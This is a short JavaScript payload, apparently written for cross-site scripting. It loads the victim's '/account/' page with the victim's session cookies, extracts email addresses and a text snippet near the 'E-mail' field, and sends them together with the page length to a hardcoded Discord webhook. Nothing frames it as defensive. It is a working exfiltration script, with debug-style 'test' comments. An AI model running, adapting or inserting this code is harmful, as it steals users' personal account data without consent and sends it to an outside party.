(async () => {
  const WH = 'https://discord.com/api/webhooks/1519411802142937118/Be6lYlqOJcp3Dvnjixe3BQMc8ukrhnSv4r6yemMGBDb9tZWWSlqPa5Nb6ba6aCvrzqzE';

  const send = (payload) => {
    const fd = new FormData();
    fd.append('payload_json', JSON.stringify(payload));
    return fetch(WH, {method:'POST', mode:'no-cors', body:fd}).catch(()=>{});
  };

  try {
    const acct = await fetch('/account/', {credentials:'include'}).then(r => r.text());

    // test 1: all email-like strings found
    const allEmails = acct.match(/[^\s<>"']+@[^\s<>"']+/g) || [];

    // test 2: raw 500 chars around "E-mail"
    const idx = acct.indexOf('E-mail');
    const snippet = idx > -1 ? acct.substring(idx, idx + 300) : 'E-mail not found at all';

    // test 3: page length to confirm full page loaded
    await send({content: '📏 Page length: ' + acct.length});
    await send({content: '📧 All emails found: ' + JSON.stringify(allEmails.slice(0, 20))});
    await send({content: '🔍 Snippet:\n```\n' + snippet.slice(0, 1900) + '\n```'});

  } catch (e) {
    await send({content: '💥 ' + String(e)});
  }
})();
